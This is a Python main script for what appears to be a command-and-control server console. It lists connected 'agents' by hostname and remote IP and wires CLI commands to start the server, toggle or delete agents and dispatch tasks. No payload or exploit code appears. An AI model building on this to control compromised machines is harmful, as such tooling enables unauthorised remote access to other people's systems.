from CLI import *
from ProcessManagment import process_q
from C2Server import C2Server

c2Server = C2Server()

def print_agents(args):
    for agent in c2Server.DB_Manager.db_get_agent_list():
        agentObj = c2Server.DB_Manager.db_get_agent(agent)
        print("--- "+agent+" ---")
        if agentObj["hostname"] != None:
            print("hostname: "+agentObj["hostname"])
        else:
            print("hostname: None")
        print("address: "+agentObj["remoteIP"])
        if(agentObj["toggled"]):
            p_success("in-use")
        else:
            p_failure("unused")
        print("\n")


start_server.set_defaults(func=c2Server.start_server)
toggle_agent.set_defaults(func=c2Server.DB_Manager.db_toggle_agent)
view_agents.set_defaults(func=print_agents)
delete_agent.set_defaults(func=c2Server.c2_delete_agent)
delete_all_agents.set_defaults(func=c2Server.c2_delete_all_agents)

for task_comm in generic_tasks:
    task_comm.set_defaults(func=c2Server.generic_task)

isRunning = True

if __name__ == "__main__":
    print(Fore.LIGHTCYAN_EX+main_menu_icon2+Fore.RESET)
    while isRunning:
        print(prompt, end="")
        user_input = input("")
        try:
            isRunning = parse_command(user_input)
        except:
            p_failure("--------")
